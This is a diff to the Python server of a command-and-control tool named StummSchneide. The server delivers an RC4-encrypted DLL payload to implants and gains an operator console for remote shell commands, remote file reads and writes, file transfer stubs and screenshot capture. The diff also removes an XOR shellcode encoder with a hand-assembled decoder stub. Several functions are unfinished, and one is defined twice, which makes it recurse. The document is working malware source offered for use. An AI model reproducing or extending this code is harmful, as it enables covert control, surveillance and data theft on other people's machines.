@@ -1,6 +1,8 @@
 import socket
 import struct
+import base64
 import os
+import shlex
 import argparse
 
 HOST = "0.0.0.0"
@@ -18,19 +20,16 @@ CMD_EXEC_CMD = 0x0003
 
 parser = argparse.ArgumentParser(
     description='[*] Server side of StummSchneide',
-    epilog='Example: python3 server.py --ip 0.0.0.0 -p 4444 --payload ./payload.dll',
+    epilog='Example:\n\tpython3 server.py\n\tpython3 server.py --ip 0.0.0.0 -p 4444 --payload ./payload.dll',
     formatter_class=argparse.RawTextHelpFormatter
 )
 
 # C2 server
-parser.add_argument('--ip', metavar='<IP>', default=HOST, help=f'C2 IPv4 listen address (default: {HOST})')
-parser.add_argument('-p', '--port', metavar='<PORT>', default=PORT, type=int, help=f'C2 listen port (default: {PORT})')
-parser.add_argument('--payload', metavar='<PATH>', default=DLL_PATH, help=f'File path of the DLL payload (default: {DLL_PATH})')
+c2_group = parser.add_argument_group('C2 Server Options')
+c2_group.add_argument('--ip', metavar='<IP>', default=HOST, help=f'C2 IPv4 listen address (default: {HOST})')
+c2_group.add_argument('-p', '--port', metavar='<PORT>', default=PORT, type=int, help=f'C2 listen port (default: {PORT})')
+c2_group.add_argument('--payload', metavar='<PATH>', default=DLL_PATH, help=f'File path of the DLL payload (default: {DLL_PATH})')
 
-# Bad chars
-parser.add_argument('-e', '--encode', action='store_true', help=f'XOR bad chars')
-parser.add_argument('--input-file', metavar='<INPUT_FILE>', help='Input shellcode file')
-parser.add_argument('--output-file', metavar='<OUTPUT_FILE>', help='Output shellcode file')
 
 args = parser.parse_args()
 
@@ -71,52 +70,49 @@ class RC4Stream:
             out[n] ^= self.S[(self.S[self.i] + self.S[self.j]) % 256]
         return bytes(out)
 
-def build_stubbed_shellcode(input_path: str, output_path: str, xor_key = 0x5A, bad_chars = None):
-    if bad_chars is None:
-        bad_chars = [0x00, 0x0a, 0x0d]
+def encapsulate(input_list: list, splitter = '|'):
+    if not input_list:
+        return ''
 
-    with open(input_path, 'rb') as f:
-        raw_shellcode = bytearray(f.read())
+    return splitter.join([base64.b64encode(str(x).encode('utf-8')).decode('utf-8') for x in input_list])
 
-    encoded_shellcode = bytearray()
-    for b in raw_shellcode:
-        encoded_byte = b ^ xor_key
+def send_command(conn: socket.socket, cmd: list):
+    return send_command(conn, encapsulate(cmd))
 
-        if encoded_byte in bad_chars:
-            print(f'Found bad char: 0x{encoded_byte:02x}')
+def send_command(conn: socket.socket, cmd: str):
+    cmd_bytes = cmd.encode('utf-8')
+    data_len = len(cmd_bytes)
+    
+    cipher = RC4Stream(RC4_KEY)
+    encrypted_cmd = cipher.crypt(cmd_bytes)
 
-        encoded_shellcode.append(encoded_byte)
+    pkt_header = struct.pack("<BBHI", MAGIC_BYTE, SENDER_DLL, CMD_EXEC_CMD, data_len)
+    conn.sendall(pkt_header + encrypted_cmd)
 
-    payload_len = len(encoded_shellcode)
+    resp_len_bytes = conn.recv(4)
+    if not resp_len_bytes or len(resp_len_bytes) < 4:
+        return "[-] Connection lost."
+    
+    resp_len = struct.unpack("<I", resp_len_bytes)[0]
+    
+    resp_data = b""
+    while len(resp_data) < resp_len:
+        chunk = conn.recv(resp_len - len(resp_data))
+        if not chunk:
+            break
+        resp_data += chunk
 
-    stub = bytearray([
-        0xeb, 0x0e, # jmp short 0x10 (skip call)
-        0x5e, # pop esi (ESI = address of shellcode)
-        0x31, 0xc9, # xor ecx, ecx
-        0x66, 0xb9, payload_len & 0xff, (payload_len >> 8) & 0xff, # mov cx, payload_len
+    dec_cipher = RC4Stream(RC4_KEY)
+    dec_data = dec_cipher.crypt(resp_data)
 
-        # XOR decryption loop
-        0x80, 0x36, xor_key, # xor byte ptr [esi], xor_key
-        0x46, # inc esi
-        0xe2, 0xfa, # loop (goto loop)
-        0xeb, 0x05, # jmp encoded_shellcode
-        0xe8, 0xed, 0xff, 0xff, 0xff, # call pop_esi
-    ])
+    try:
+        return dec_data.decode('cp950', errors='ignore')
+    except:
+        return dec_data.decode('utf-8', errors='ignore')
 
-    for bc in bad_chars:
-        if bc in stub:
-            print(f'[-] Error: Decoder Stub contains bad char: 0x{bc:02x}')
-            return
-
-    final_payload = stub + encoded_shellcode
-
-    with open(output_path, 'wb') as f:
-        f.write(final_payload)
-
-    print(f'[+] Built stubbed shellcode binary file successfully')
-    print(f'[+] Stub: {len(stub)} bytes')
-    print(f'[+] payload: {payload_len} bytes')
-    print(f'[+] stubbed: {len(final_payload)} bytes')
+def do_info(conn: socket.socket):
+    cmd = encapsulate(['info'])
+    print(send_command(conn, cmd))
 
 def do_cmd(conn: socket.socket):
     while True:
@@ -127,44 +123,139 @@ def do_cmd(conn: socket.socket):
             if cmd_input.lower() in ["exit", "quit"]:
                 break
 
-            cmd_bytes = cmd_input.encode('utf-8')
-            data_len = len(cmd_bytes)
-            
-            cipher = RC4Stream(RC4_KEY)
-            encrypted_cmd = cipher.crypt(cmd_bytes)
-
-            pkt_header = struct.pack("<BBHI", MAGIC_BYTE, SENDER_DLL, CMD_EXEC_CMD, data_len)
-            conn.sendall(pkt_header + encrypted_cmd)
-
-            resp_len_bytes = conn.recv(4)
-            if not resp_len_bytes or len(resp_len_bytes) < 4:
-                print("[-] Connection lost.")
-                break
-            
-            resp_len = struct.unpack("<I", resp_len_bytes)[0]
-            
-            resp_data = b""
-            while len(resp_data) < resp_len:
-                chunk = conn.recv(resp_len - len(resp_data))
-                if not chunk:
-                    break
-                resp_data += chunk
-
-            dec_cipher = RC4Stream(RC4_KEY)
-            dec_data = dec_cipher.crypt(resp_data)
-
-            try:
-                print(dec_data.decode('cp950', errors='ignore'))
-            except:
-                print(dec_data.decode('utf-8', errors='ignore'))
+            cmd_input = encapsulate(['cmd', 'exec', cmd_input])
+            print(send_command(conn, cmd_input))
 
         except Exception as e:
             print(f"[-] Terminal error: {e}")
             break
 
+def do_read(conn: socket.socket, *args):
+    if len(args) < 1:
+        print("[-] Usage: read <REMOTE_PATH>")
+        return
+
+    remote_path = args[0]
+
+    cmd = encapsulate(['file', 'read', remote_path])
+    content = send_command(conn, cmd)
+
+    print(f'File({remote_path}) content: \n')
+    print(base64.b64decode(content).decode('utf-8'))
+    print('\n')
+
+def do_write(conn: socket.socket, *args):
+    if len(args) < 2:
+        print("[-] Usage: write '<STRING_CONTENT>' '<REMOTE_PATH>'")
+        return
+
+    content, remote_path = args[0], args[1]
+    cmd = encapsulate(['file', 'write', remote_path, content])
+
+
+def do_upload(conn: socket.socket, *args):
+    if len(args) < 2:
+        print("[-] Usage: upload '<LOCAL_PATH>' '<REMOTE_PATH>'")
+        return
+
+    local_path, remote_path = args[0], args[1]
+
+
+
+def do_download(conn: socket.socket, *args):
+    if len(args) < 2:
+        print("[-] Usage: download '<REMOTE_PATH>' '<LOCAL_PATH>'")
+        return
+
+    remote_path, local_path = args[0], args[1]
+
+
+
+def do_filemgr(conn: socket.socket):
+    dicCmd = {
+        'read': {
+            'help': 'Read remote file with a specified path',
+            'usage': 'read <REMOTE_PATH>',
+            'action': do_read
+        },
+        'write': {
+            'help': 'Write string content into a specified path',
+            'usage': "write '<STRING_CONTENT>' '<REMOTE_PATH>'",
+            'action': do_write
+        },
+        'upload': {
+            'help': 'Upload file',
+            'usage': "upload '<LOCAL_PATH>' '<REMOTE_PATH>'",
+            'action': do_upload
+        },
+        'download': {
+            'help': 'Download file',
+            'usage': "download '<REMOTE_PATH>' '<LOCAL_PATH>'",
+            'action': do_download
+        }
+    }
+
+    while True:
+        try:
+            cmd = input('FileMgr> ').strip()
+            if not cmd:
+                continue
+            
+            cmd_args = shlex.split(cmd)
+
+            if len(cmd_args) == 0:
+                continue
+
+            command = cmd_args[0]
+
+            if command == 'help':
+                if len(cmd_args) == 1:
+                    for c in dicCmd.keys():
+                        print(f"{c}: {dicCmd[c]['help']}")
+                else:
+                    target_cmd = cmd_args[1]
+                    if target_cmd not in dicCmd:
+                        print(f'Unknown command: {target_cmd}')
+                    else:
+                        print(f"Example: {dicCmd[target_cmd].get('usage', 'No usage provided')}")
+                continue
+
+            if command not in dicCmd:
+                print(f'[-] Unknown command: {command}')
+                continue
+
+            action = dicCmd[command].get('action')
+            if action:
+                try:
+                    action(conn, *cmd_args[1:])
+                except Exception as e:
+                    print(f'[-] Execution error: {e}')
+
+        except Exception as ex:
+            print(f"Error: {str(ex)}")
+            break
+
+def do_screenshot(conn: socket.socket):
+    cmd = encapsulate(['screen'])
+    b64Data = send_command(conn, cmd)
+
+    try:
+        image_bytes = base64.b64decode(b64Data)
+        with open('screenshot.jpg', 'wb') as f:
+            f.write(image_bytes)
+
+    except Exception as ex:
+        print(f'[-] Error: {ex}')
+
+def do_webcam(conn: socket.socket):
+    pass
+
 def do_interactive(conn: socket.socket):
     module = {
+        'info': do_info,
         'cmd' : do_cmd,
+        'filemgr': do_filemgr,
+        'screenshot': do_screenshot,
         'exit': '',
     }
 
@@ -185,12 +276,6 @@ def do_interactive(conn: socket.socket):
         module[option](conn)
 
 def main():
-    if args.encode:
-        if not (args.input_file and args.output_file):
-            return
-        
-        build_stubbed_shellcode(args.input_file, args.output_file)
-        return
 
     if not os.path.exists(args.payload):
         print('[-] Payload file not found: ' + args.payload)
@@ -201,6 +286,7 @@ def main():
 
     dll_bytes = rc4_crypt(RC4_KEY, dll_bytes)
     dll_len = len(dll_bytes)
+    
     print(f"[*] Loaded payload.dll: {dll_len} bytes")
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
@@ -210,8 +296,8 @@ def main():
         print(f"[*] Listening on {args.ip}:{args.port} (RC4)...")
 
         while True:
-            conn, addr = srv.accept()
             try:
+                conn, addr = srv.accept()
                 header_peek = conn.recv(8, socket.MSG_PEEK)
                 if len(header_peek) < 8:
                     conn.close()
